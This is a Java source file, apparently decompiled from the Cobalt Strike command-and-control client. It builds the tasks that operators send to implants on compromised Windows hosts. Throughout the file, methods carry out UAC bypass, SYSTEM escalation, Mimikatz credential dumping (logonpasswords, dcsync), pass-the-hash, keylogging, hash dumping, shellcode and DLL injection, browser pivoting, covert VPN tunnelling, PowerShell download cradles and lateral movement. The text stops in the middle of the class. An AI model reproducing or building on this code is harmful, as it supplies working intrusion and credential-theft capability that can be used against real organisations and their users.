package beacon;

import aggressor.AggressorClient;
import aggressor.DataManager;
import aggressor.DataUtils;
import aggressor.GlobalDataManager;
import beacon.inline.BypassUACToken;
import beacon.inline.GetSystem;
import beacon.inline.KerberosTicketPurge;
import beacon.inline.KerberosTicketUse;
import beacon.inline.NetDomain;
import beacon.jobs.BypassUACJob;
import beacon.jobs.DesktopJob;
import beacon.jobs.DllSpawnJob;
import beacon.jobs.ExecuteAssemblyJob;
import beacon.jobs.HashdumpJob;
import beacon.jobs.KeyloggerJob;
import beacon.jobs.MimikatzJob;
import beacon.jobs.MimikatzJobSmall;
import beacon.jobs.NetViewJob;
import beacon.jobs.PortScannerJob;
import beacon.jobs.PowerShellJob;
import beacon.jobs.ScreenshotJob;
import beacon.setup.BrowserPivot;
import common.ArtifactUtils;
import common.AssertUtils;
import common.BeaconEntry;
import common.BeaconOutput;
import common.ByteIterator;
import common.CommonUtils;
import common.ListenerUtils;
import common.MudgeSanity;
import common.PowerShellUtils;
import common.ReflectiveDLL;
import common.ResourceUtils;
import common.ScListener;
import common.Shellcode;
import common.TeamQueue;
import common.VPNClient;
import dialog.DialogUtils;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Stack;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import kerberos.KerberosUtils;
import pe.PEParser;

public class TaskBeacon {
    protected GlobalDataManager gdata = GlobalDataManager.getGlobalDataManager();

    protected String[] bids;

    protected TeamQueue conn;

    protected EncodedCommandBuilder builder = null;

    protected DataManager data;

    protected AggressorClient client;

    protected boolean silent = false;

    private static Pattern funcp = null;

    public AggressorClient getClient() {
        return this.client;
    }

    public void silent() {
        this.silent = true;
    }

    public boolean disableAMSI() {
        return DataUtils.disableAMSI(this.data);
    }

    public boolean obfuscatePostEx() {
        return DataUtils.obfuscatePostEx(this.data);
    }

    public boolean useSmartInject() {
        return DataUtils.useSmartInject(this.data);
    }

    public String arch(String string) {
        BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, string);
        if (beaconEntry != null) {
            return beaconEntry.arch();
        }
        return "x86";
    }

    public TaskBeacon(AggressorClient aggressorClient, String[] arrstring) {
        this(aggressorClient, aggressorClient.getData(), aggressorClient.getConnection(), arrstring);
    }

    public TaskBeacon(AggressorClient aggressorClient, DataManager dataManager, TeamQueue teamQueue, String[] arrstring) {
        this.client = aggressorClient;
        this.bids = arrstring;
        this.conn = teamQueue;
        this.data = dataManager;
        this.builder = new EncodedCommandBuilder(aggressorClient);
    }

    public void task(byte[] arrby1, byte[] arrby2, String string) {
        task(arrby1, arrby2, string, "");
    }

    public String getPsExecService() {
        String str = this.client.getScriptEngine().format("PSEXEC_SERVICE", new Stack());
        if (str == null || "".equals(str)) {
            return CommonUtils.garbage("service");
        }
        return str;
    }

    public void whitelistPort(String string, int n) {
        this.conn.call("beacons.whitelist_port", CommonUtils.args(string, n));
    }

    public void task(byte[] arrby1, byte[] arrby2, String string1, String string2) {
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], string1, string2);
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby1));
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby2));
        }
    }

    public void log_task(String string1, String string2) {
        log_task(string1, string2, "");
    }

    public void log_task(String string1, String string2, String string3) {
        if (this.silent)
            return;
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Task(string1, string2, string3)));
    }

    public void input(String string) {
        for (int i = 0; i < this.bids.length; i++)
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(this.bids[i], string)));
    }

    public void log(String string) {
        for (int i = 0; i < this.bids.length; i++)
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Output(this.bids[i], string)));
    }

    public void log2(String string) {
        for (int i = 0; i < this.bids.length; i++)
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.OutputB(this.bids[i], string)));
    }

    public void error(String string) {
        for (int i = 0; i < this.bids.length; i++)
            error(this.bids[i], string);
    }

    public void error(String string1, String string2) {
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(string1, string2)));
    }

    public void task(String string) {
        task(string, "");
    }

    public void task(String string1, String string2) {
        for (int i = 0; i < this.bids.length; i++)
            log_task(this.bids[i], string1, string2);
    }

    public void task(String string1, byte[] arrby, String string2) {
        task(string1, arrby, string2, "");
    }

    public void task(String string1, byte[] arrby1, byte[] arrby2, String string2) {
        task(string1, arrby1, arrby2, string2, "");
    }

    public void task(String string1, byte[] arrby, String string2, String string3) {
        log_task(string1, string2, string3);
        this.conn.call("beacons.task", CommonUtils.args(string1, arrby));
    }

    public void task(String string1, byte[] arrby1, byte[] arrby2, String string2, String string3) {
        log_task(string1, string2, string3);
        this.conn.call("beacons.task", CommonUtils.args(string1, arrby1));
        this.conn.call("beacons.task", CommonUtils.args(string1, arrby2));
    }

    protected void taskNoArgs(int n, String string) {
        taskNoArgs(n, string, "");
    }

    protected void taskNoArgs(int n, String string1, String string2) {
        this.builder.setCommand(n);
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], string1, string2);
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    protected void taskNoArgsCallback(int n, String string) {
        taskNoArgsCallback(n, string, "");
    }

    protected void taskNoArgsCallback(int n, String string1, String string2) {
        this.builder.setCommand(n);
        this.builder.addInteger(0);
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], string1, string2);
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    protected void taskOneArg(int n, String string1, String string2) {
        taskOneArg(n, string1, string2, "");
    }

    protected void taskOneArg(int n, String string1, String string2, String string3) {
        this.builder.setCommand(n);
        this.builder.addString(string1);
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], string2, string3);
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    protected void taskOneEncodedArg(int n, String string1, String string2, String string3) {
        for (int i = 0; i < this.bids.length; i++) {
            this.builder.setCommand(n);
            this.builder.addEncodedString(this.bids[i], string1);
            byte[] arrby = this.builder.build();
            log_task(this.bids[i], string2, string3);
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    protected void taskOneArgI(int n1, int n2, String string) {
        taskOneArgI(n1, n2, string, "");
    }

    protected void taskOneArgI(int n1, int n2, String string1, String string2) {
        this.builder.setCommand(n1);
        this.builder.addInteger(n2);
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], string1, string2);
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    protected void taskOneArgS(int n1, int n2, String string) {
        taskOneArgS(n1, n2, string, "");
    }

    protected void taskOneArgS(int n1, int n2, String string1, String string2) {
        this.builder.setCommand(n1);
        this.builder.addShort(n2);
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], string1, string2);
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public String cmd_sanity(String string1, String string2) {
        if (string1.length() > 8191)
            CommonUtils.print_error(string2 + " command is " + string1.length() + " bytes. This exceeds the 8191 byte command-line string limitation in Windows. This action will fail. Likely, your Resource Kit script is generating a script that is too large. Optimize your templates for size.");
        return string1;
    }

    public void BrowserPivot(int n, String string) {
        for (int i = 0; i < this.bids.length; i++)
            BrowserPivot(this.bids[i], n, string, CommonUtils.randomPort());
    }

    public void BrowserPivot(String string1, int n1, String string2, int n2) {
        int i = CommonUtils.randomPort();
        byte[] arrby1 = (new BrowserPivot(this, i, string2.equals("x64"))).export();
        if (string2.equals("x64")) {
            this.builder.setCommand(43);
        } else {
            this.builder.setCommand(9);
        }
        this.builder.addInteger(n1);
        this.builder.addInteger(0);
        this.builder.addString(CommonUtils.bString(arrby1));
        this.builder.pad(arrby1.length, 1024);
        byte[] arrby2 = this.builder.build();
        log_task(string1, "Injecting browser pivot DLL into " + n1, "T1111, T1055, T1185");
        this.conn.call("beacons.task", CommonUtils.args(string1, arrby2));
        this.conn.call("browserpivot.start", CommonUtils.args(string1, n2 + "", i + ""));
        GoInteractive(string1);
        this.conn.call("beacons.portfwd", CommonUtils.args(string1, "127.0.0.1", Integer.valueOf(i)));
    }

    public void BrowserPivotStop() {
        for (int i = 0; i < this.bids.length; i++)
            this.conn.call("browserpivot.stop", CommonUtils.args(this.bids[i]));
    }

    public void BypassUAC(String string) {
        ScListener scListener = ListenerUtils.getListener(this.client, string);
        for (int i = 0; i < this.bids.length; i++)
            _BypassUAC(this.bids[i], scListener);
        linkToPayloadLocal(scListener);
    }

    protected void _BypassUAC(String string, ScListener scListener) {
        int i = CommonUtils.randomPort();
        String str = CommonUtils.garbage("elev") + ".dll";
        BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, string);
        if (beaconEntry == null) {
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(string, "Please wait until Beacon checks in next [could not find metadata]")));
            return;
        }
        byte[] arrby1 = scListener.getPayloadStagerLocal(i, "x86");
        byte[] arrby2 = null;
        if (beaconEntry.is64()) {
            if (beaconEntry.getVersion() >= 6.2D) {
                arrby2 = (new ArtifactUtils(this.client)).patchArtifact(arrby1, "artifactuac64alt.dll");
            } else {
                arrby2 = (new ArtifactUtils(this.client)).patchArtifact(arrby1, "artifactuac64.dll");
            }
        } else if (beaconEntry.getVersion() >= 6.2D) {
            arrby2 = (new ArtifactUtils(this.client)).patchArtifact(arrby1, "artifactuac32alt.dll");
        } else {
            arrby2 = (new ArtifactUtils(this.client)).patchArtifact(arrby1, "artifactuac32.dll");
        }
        if (arrby2.length >= 24576) {
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(string, "UAC artifact template (" + arrby2.length + " bytes) exceeds the 24576 byte max. Make your UAC artifacts smaller.")));
            return;
        }
        new BypassUACJob(this, str, scListener.toString(), arrby2).spawn(string, beaconEntry.is64() ? "x64" : "x86");
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.FileIndicator(string, str, arrby2)));
        StageTCP(string, "127.0.0.1", i, "x86", scListener);
    }

    public void BypassUACToken(String string) {
        ScListener scListener = ListenerUtils.getListener(this.client, string);
        for (int i = 0; i < this.bids.length; i++)
            BypassUACToken(this.bids[i], scListener);
        linkToPayloadLocal(scListener);
    }

    public void BypassUACToken(String string, ScListener scListener) {
        String str = arch(string);
        byte[] arrby = scListener.export(str);
        log_task(string, "Tasked beacon to spawn " + scListener + " in a high integrity process (token duplication)", "T1088, T1093");
        new BypassUACToken(this.client, arrby).spawnAndInject(string);
    }

    public String SetupPayloadDownloadCradle(String string, ScListener scListener) {
        String str1 = arch(string);
        byte[] arrby1 = scListener.export(str1);
        byte[] arrby2 = (new ResourceUtils(this.client)).buildPowerShell(arrby1, "x64".equals(str1));
        int i = CommonUtils.randomPort();
        String str2 = new PowerShellUtils(this.client).format(
                new PowerShellUtils(this.client).PowerShellDownloadCradle("http://127.0.0.1:" + i + "/"), false);
        this.builder.setCommand(59);
        this.builder.addShort(i);
        this.builder.addString(arrby2);
        byte[] arrby3 = this.builder.build();
        this.conn.call("beacons.task", CommonUtils.args(string, arrby3));
        return str2;
    }

    public String SetupPayloadDownloadCradle(String string1, String string2, ScListener scListener) {
        byte[] arrby1 = scListener.export(string2);
        byte[] arrby2 = (new ResourceUtils(this.client)).buildPowerShell(arrby1, "x64".equals(string2));
        int i = CommonUtils.randomPort();
        String str = (new PowerShellUtils(this.client)).format((new PowerShellUtils(this.client)).PowerShellDownloadCradle("http://127.0.0.1:" + i + "/"), false);
        this.builder.setCommand(59);
        this.builder.addShort(i);
        this.builder.addString(arrby2);
        byte[] arrby3 = this.builder.build();
        this.conn.call("beacons.task", CommonUtils.args(string1, arrby3));
        return str;
    }

    public void Checkin() {
        taskNoArgs(8, "Tasked beacon to checkin");
    }

    public void Cancel(String string) {
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked " + CommonUtils.session(this.bids[i]) + " to cancel downloads that match " + string);
            this.conn.call("beacons.download_cancel", CommonUtils.args(this.bids[i], string));
        }
    }

    public void Cd(String string) {
        taskOneEncodedArg(5, string, "cd " + string, "");
    }

    public void Clear() {
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Cleared " + CommonUtils.session(this.bids[i]) + " queue");
            this.conn.call("beacons.clear", CommonUtils.args(this.bids[i]));
        }
    }

    public void Connect(String string) {
        Connect(string, DataUtils.getProfile(this.client.getData()).getInt(".tcp_port"));
    }

    public void Connect(String string, int n) {
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked to connect to " + string + ":" + n, "T1090");
            ConnectExplicit(this.bids[i], string, n);
        }
    }

    public void ConnectExplicit(String string1, String string2, int n) {
        this.builder.setCommand(86);
        this.builder.addShort(n);
        this.builder.addStringASCIIZ(string2);
        this.conn.call("beacons.task", CommonUtils.args(string1, this.builder.build()));
    }

    public String file_to_tactic(String string) {
        string = string.toLowerCase();
        if (string.startsWith("\\\\") && (CommonUtils.isin("\\C$", string) || CommonUtils.isin("\\ADMIN$", string))) {
            return "T1077";
        }
        return "";
    }

    public void BlockDLLs(boolean bl) {
        if (bl) {
            taskOneArgI(92, 1, "Tasked beacon to block non-Microsoft binaries in child processes", "T1106");
        } else {
            taskOneArgI(92, 0, "Tasked beacon to not block non-Microsoft binaries in child processes", "T1106");
        }
    }

    public void Copy(String string1, String string2) {
        for (int i = 0; i < this.bids.length; i++) {
            this.builder.setCommand(73);
            this.builder.addLengthAndEncodedString(this.bids[i], string1);
            this.builder.addLengthAndEncodedString(this.bids[i], string2);
            byte[] arrby = this.builder.build();
            log_task(this.bids[i], "Tasked beacon to copy " + string1 + " to " + string2, file_to_tactic(string2));
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public void CovertVPN(String string1, String string2, String string3, String string4) {
        BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, string1);
        if (beaconEntry != null && beaconEntry.getVersion() >= 10.0D) {
            error("CovertVPN is not compatible with Windows 10");
            return;
        }
        Map map = DataUtils.getInterface(this.data, string2);
        if (map.size() == 0) {
            error("No interface " + string2);
            return;
        }
        if (string4 != null) {
            this.conn.call("cloudstrike.set_tap_hwaddr", CommonUtils.args(string2, string4));
        }
        String str = DataUtils.getLocalIP(this.data);
        HashSet hashSet = new HashSet(DataUtils.getBeaconChain(this.data, string1));
        byte[] arrby = VPNClient.exportClient(str, string3, map, hashSet);
        if (arrby.length == 0) {
            return;
        }
        arrby = ReflectiveDLL.patchDOSHeader(arrby);
        if ("TCP (Bind)".equals(map.get("channel"))) {
            GoInteractive(string1);
            this.conn.call("beacons.portfwd", CommonUtils.args(string1, "127.0.0.1", map.get("port")));
        }
        taskOneArg(1, CommonUtils.bString(arrby), "Tasked beacon to deploy Covert VPN for " + string2, "T1093");
    }

    public void CovertVPN(String string1, String string2) {
        for (int i = 0; i < this.bids.length; i++)
            CovertVPN(this.bids[i], string1, string2, null);
    }

    public void DcSync(String string1, String string2) {
        MimikatzSmall("@lsadump::dcsync /domain:" + string1 + " /user:" + string2);
    }

    public void DcSync(String string) {
        MimikatzSmall("@lsadump::dcsync /domain:" + string + " /all /csv");
    }

    public void Desktop(boolean bl) {
        for (int i = 0; i < this.bids.length; i++) {
            GoInteractive(this.bids[i]);
            (new DesktopJob(this)).spawn(this.bids[i], arch(this.bids[i]), bl);
        }
    }

    public void Desktop(int n, String string, boolean bl) {
        for (int i = 0; i < this.bids.length; i++) {
            GoInteractive(this.bids[i]);
            new DesktopJob(this).inject(this.bids[i], n, string, bl);
        }
    }

    public void Die() {
        this.builder.setCommand(3);
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked " + CommonUtils.session(this.bids[i]) + " to exit");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public void DllInject(int n, String string) {
        byte[] arrby1 = CommonUtils.readFile(string);
        int ref = ReflectiveDLL.findReflectiveLoader(arrby1);
        if (ref <= 0) {
            error("Could not find reflective loader in " + string);
            return;
        }
        if (ReflectiveDLL.is64(arrby1)) {
            this.builder.setCommand(43);
        } else {
            this.builder.setCommand(9);
        }
        this.builder.addInteger(n);
        this.builder.addInteger(ref);
        this.builder.addString(CommonUtils.bString(arrby1));
        byte[] arrby2 = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked beacon to inject " + string + " into "
                    + n, "T1055");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby2));
        }
    }

    public void DllLoad(int n, String string) {
        this.builder.setCommand(80);
        this.builder.addInteger(n);
        this.builder.addString(string + Character.MIN_VALUE);
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked beacon to load " + string + " into " + n, "T1055");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public void DllSpawn(String string1, String string2, String string3, int n, boolean bl) {
        DllSpawnJob dllSpawnJob = new DllSpawnJob(this, string1, string2, string3, n, bl);
        for (int i = 0; i < this.bids.length; i++)
            dllSpawnJob.spawn(this.bids[i]);
    }

    public void Download(String string) {
        if (this.bids.length > 0)
            if (string.startsWith("\\\\")) {
                taskOneEncodedArg(11, string, "Tasked " + CommonUtils.session(this.bids[0]) + " to download " + string, "T1039");
            } else {
                taskOneEncodedArg(11, string, "Tasked " + CommonUtils.session(this.bids[0]) + " to download " + string, "T1005");
            }
    }

    public void Drives() {
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked beacon to list drives");
            this.conn.call("beacons.task_drives_default", CommonUtils.args(this.bids[i]));
        }
    }

    public void Elevate(String string1, String string2) {
        BeaconExploits.Exploit exploit = DataUtils.getBeaconExploits(this.data).getExploit(string1);
        for (int i = 0; i < this.bids.length; i++)
            exploit.elevate(this.bids[i], string2);
    }

    public void ElevateCommand(String string1, String string2) {
        BeaconElevators.Elevator elevator = DataUtils.getBeaconElevators(this.data).getCommandElevator(string1);
        for (int i = 0; i < this.bids.length; i++)
            elevator.runasadmin(this.bids[i], string2);
    }

    public void Execute(String string) {
        taskOneEncodedArg(12, string, "Tasked beacon to execute: " + string, "T1106");
    }

    public void ExecuteAssembly(String string1, String string2) {
        PEParser pEParser = PEParser.load(CommonUtils.readFile(string1));
        if (!pEParser.isProcessAssembly()) {
            error("File " + string1 + " is not a process assembly (.NET EXE)");
            return;
        }
        for (int i = 0; i < this.bids.length; i++) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bids[i]);
            if (beaconEntry.is64()) {
                (new ExecuteAssemblyJob(this, string1, string2, "x64")).spawn(this.bids[i]);
            } else {
                (new ExecuteAssemblyJob(this, string1, string2, "x86")).spawn(this.bids[i]);
            }
        }
    }

    public void GetPrivs() {
        GetPrivs("SeDebugPrivilege, SeTcbPrivilege, SeCreateTokenPrivilege, SeAssignPrimaryTokenPrivilege, SeLockMemoryPrivilege, SeIncreaseQuotaPrivilege, SeUnsolicitedInputPrivilege, SeMachineAccountPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeSystemProfilePrivilege, SeSystemtimePrivilege, SeProfileSingleProcessPrivilege, SeIncreaseBasePriorityPrivilege, SeCreatePagefilePrivilege, SeCreatePermanentPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeShutdownPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeChangeNotifyPrivilege, SeRemoteShutdownPrivilege, SeUndockPrivilege, SeSyncAgentPrivilege, SeEnableDelegationPrivilege, SeManageVolumePrivilege");
    }

    public void GetPrivs(String string) {
        this.builder.setCommand(77);
        this.builder.addStringArray(CommonUtils.toArray(string));
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked beacon to enable privileges", "T1134");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public void GetSystem() {
        for (int i = 0; i < this.bids.length; i++)
            GetSystem(this.bids[i]);
    }

    public void GetSystem(String string) {
        log_task(string, "Tasked beacon to get SYSTEM", "T1134");
        new GetSystem(this.client).go(string);
    }

    public void GetUID() {
        taskNoArgs(27, "Tasked beacon to get userid");
    }

    public void Hashdump() {
        for (int i = 0; i < this.bids.length; i++) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bids[i]);
            if (beaconEntry.is64()) {
                new HashdumpJob(this).spawn(this.bids[i], "x64");
            } else {
                new HashdumpJob(this).spawn(this.bids[i], "x86");
            }
        }
    }

    public void Inject(int n, String string) {
        Inject(n, string, "x86");
    }

    public void Inject(int n, String string1, String string2) {
        AssertUtils.TestPID(n);
        AssertUtils.TestSetValue(string2, "x86, x64");
        ScListener scListener = ListenerUtils.getListener(this.client, string1);
        byte[] arrby1 = scListener.export(string2, 1);
        if (string2.equals("x86")) {
            this.builder.setCommand(9);
        } else if (string2.equals("x64")) {
            this.builder.setCommand(43);
        }
        this.builder.addInteger(n);
        this.builder.addInteger(0);
        this.builder.addString(CommonUtils.bString(arrby1));
        byte[] arrby2 = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked beacon to inject " + scListener + " into " + n + " (" + string2 + ")", "T1055");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby2));
        }
        linkToPayloadLocal(scListener);
    }

    public void InlineExecute(String string) {
        String str = "";
        for (byte b = 0; b < this.bids.length; b++) {
            String str1 = arch(this.bids[b]);
            this.builder.setCommand(95);
            if ("x86".equals(str1)) {
                str = "resources/postex.dll";
            } else {
                str = "resources/postex.x64.dll";
            }
            byte[] arrby1 = CommonUtils.readResource(str);
            PEParser pEParser = PEParser.load(arrby1);
            byte[] arrby2 = pEParser.carveExportedFunction(string);
            CommonUtils.print_info("Carved: " + arrby2.length + " bytes from " + str);
            CommonUtils.writeToFile(new File("carved.bin"), arrby2);
            this.builder.addLengthAndStringASCIIZ("\000");
            this.builder.addString(arrby2);
            log_task(this.bids[b], "Tasked beacon to execute " + str + "!" + string, "");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[b], this.builder.build()));
        }
    }

    public void JobKill(int n) {
        this.builder.setCommand(42);
        this.builder.addShort(n);
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked beacon to kill job " + n);
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public void Jobs() {
        taskNoArgs(41, "Tasked beacon to list jobs");
    }

    public void Jump(String string1, String string2, String string3) {
        BeaconRemoteExploits.RemoteExploit remoteExploit = DataUtils.getBeaconRemoteExploits(this.data).getRemoteExploit(string1);
        for (int i = 0; i < this.bids.length; i++)
            remoteExploit.jump(this.bids[i], string2, string3);
    }

    public void KerberosTicketPurge() {
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked beacon to purge kerberos tickets", "T1097");
            (new KerberosTicketPurge(this.client)).go(this.bids[i]);
        }
    }

    public void KerberosTicketUse(String string) {
        byte[] arrby = CommonUtils.readFile(string);
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked beacon to apply ticket in " + string, "T1097");
            new KerberosTicketUse(this.client, arrby).go(this.bids[i]);
        }
    }

    public void KerberosCCacheUse(String string) {
        byte[] arrby = KerberosUtils.ConvertCCacheToKrbCred(string);
        if (arrby.length == 0) {
            error("Could not extract ticket from " + string);
        } else {
            for (int i = 0; i < this.bids.length; i++) {
                log_task(this.bids[i], "Tasked beacon to extract and apply ticket from " + string, "T1097");
                new KerberosTicketUse(this.client, arrby).go(this.bids[i]);
            }
        }
    }

    public void KeyLogger() {
        for (int i = 0; i < this.bids.length; i++) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bids[i]);
            if (beaconEntry != null) {
                new KeyloggerJob(this).spawn(this.bids[i], beaconEntry.arch());
            }
        }
    }

    public void KeyLogger(int n, String string) {
        (new KeyloggerJob(this)).inject(n, string);
    }

    public void Kill(int n) {
        taskOneArgI(33, n, "Tasked beacon to kill " + n);
    }

    public void Link(String string) {
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked to link to " + string, "T1090");
            LinkExplicit(this.bids[i], string);
        }
    }

    public void LinkExplicit(String string1, String string2) {
        this.builder.setCommand(68);
        this.builder.addStringASCIIZ(string2);
        this.conn.call("beacons.task", CommonUtils.args(string1, this.builder.build()));
    }

    public void LoginUser(String string1, String string2, String string3) {
        for (int i = 0; i < this.bids.length; i++) {
            this.builder.setCommand(49);
            this.builder.addLengthAndEncodedString(this.bids[i], string1);
            this.builder.addLengthAndEncodedString(this.bids[i], string2);
            this.builder.addLengthAndEncodedString(this.bids[i], string3);
            byte[] arrby = this.builder.build();
            log_task(this.bids[i], "Tasked beacon to create a token for " + string1 + "\\" + string2, "T1134");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public void LogonPasswords() {
        MimikatzSmall("sekurlsa::logonpasswords");
    }

    public void Ls(String string) {
        for (int i = 0; i < this.bids.length; i++) {
            if (string.startsWith("\\\\") && string.endsWith("$")) {
                log_task(this.bids[i], "Tasked beacon to list files in " + string, "T1077");
            } else {
                log_task(this.bids[i], "Tasked beacon to list files in " + string);
            }
            String str = CommonUtils.bString(DataUtils.encodeForBeacon(this.data, this.bids[i], string));
            this.conn.call("beacons.task_ls_default", CommonUtils.args(this.bids[i], str));
        }
    }

    public void Message(String string) {
    }

    public void Mimikatz(String string) {
        for (int i = 0; i < this.bids.length; i++) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bids[i]);
            if (beaconEntry.is64()) {
                (new MimikatzJob(this, string)).spawn(this.bids[i], "x64");
            } else {
                (new MimikatzJob(this, string)).spawn(this.bids[i], "x86");
            }
        }
    }

    public void MimikatzSmall(String string) {
        for (int i = 0; i < this.bids.length; i++) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bids[i]);
            if (beaconEntry.is64()) {
                (new MimikatzJobSmall(this, string)).spawn(this.bids[i], "x64");
            } else {
                (new MimikatzJobSmall(this, string)).spawn(this.bids[i], "x86");
            }
        }
    }

    public void MkDir(String string) {
        taskOneEncodedArg(54, string, "Tasked beacon to make directory " + string, "");
    }

    protected void mode(String string1, String string2) {
        for (int i = 0; i < this.bids.length; i++) {
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Mode(this.bids[i], string2)));
            this.conn.call("beacons.mode", CommonUtils.args(this.bids[i], string1));
        }
    }

    public void ModeDNS() {
        mode("dns", "data channel set to DNS");
    }

    public void ModeDNS6() {
        mode("dns6", "data channel set to DNS6");
    }

    public void ModeDNS_TXT() {
        mode("dns-txt", "data channel set to DNS-TXT");
    }

    public void ModeHTTP() {
        mode("http", "data channel set to HTTP");
    }

    public void Move(String string1, String string2) {
        for (int i = 0; i < this.bids.length; i++) {
            this.builder.setCommand(74);
            this.builder.addLengthAndEncodedString(this.bids[i], string1);
            this.builder.addLengthAndEncodedString(this.bids[i], string2);
            byte[] arrby = this.builder.build();
            log_task(this.bids[i], "Tasked beacon to move " + string1 + " to " + string2, file_to_tactic(string2));
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public void NetView(String string1, String string2, String string3) {
        if ("domain".equals(string1)) {
            for (int i = 0; i < this.bids.length; i++) {
                log_task(this.bids[i], "Tasked beacon to run net domain");
                new NetDomain(this.client).go(this.bids[i]);
            }
        } else {
            _NetView(string1, string2, string3);
        }
    }

    public void _NetView(String string1, String string2, String string3) {
        for (int i = 0; i < this.bids.length; i++) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bids[i]);
            if (beaconEntry != null) {
                (new NetViewJob(this, string1, string2, string3)).spawn(this.bids[i], beaconEntry.arch());
            }
        }
    }

    public void Note(String string) {
        for (int i = 0; i < this.bids.length; i++)
            this.conn.call("beacons.note", CommonUtils.args(this.bids[i], string));
    }

    public void OneLiner(String string1, String string2) {
        ScListener scListener = ListenerUtils.getListener(this.client, string1);
        for (int i = 0; i < this.bids.length; i++) {
            String str = SetupPayloadDownloadCradle(this.bids[i], string2, scListener);
            DialogUtils.addToClipboardQuiet(str);
            log_task(this.bids[i], "Setup " + str + " to run " + scListener + " (" + string2 + ")", "T1086");
        }
    }

    public void PassTheHash(String string1, String string2, String string3) {
        String str1 = "\\\\.\\pipe\\" + CommonUtils.garbage("system");
        String str2 = CommonUtils.garbage("random data");
        String str3 = "%COMSPEC% /c echo " + str2 + " > " + str1;
        this.builder.setCommand(60);
        this.builder.addString(str1);
        byte[] arrby1 = builder.build();
        for (int i = 0; i < bids.length; i++) {
            this.conn.call("beacons.task", CommonUtils.args(bids[i], arrby1));
        }
        MimikatzSmall("sekurlsa::pth /user:" + string2
                + " /domain:" + string1 + " /ntlm:" + string3
                + " /run:\"" + str3 + "\"");
        this.builder.setCommand(61);
        byte[] arrby2 = this.builder.build();
        for (String bid : bids) {
            conn.call("beacons.task", CommonUtils.args(bid, arrby2));
        }
    }

    public void Pause(int n) {
        this.builder.setCommand(47);
        this.builder.addInteger(n);
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++)
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
    }

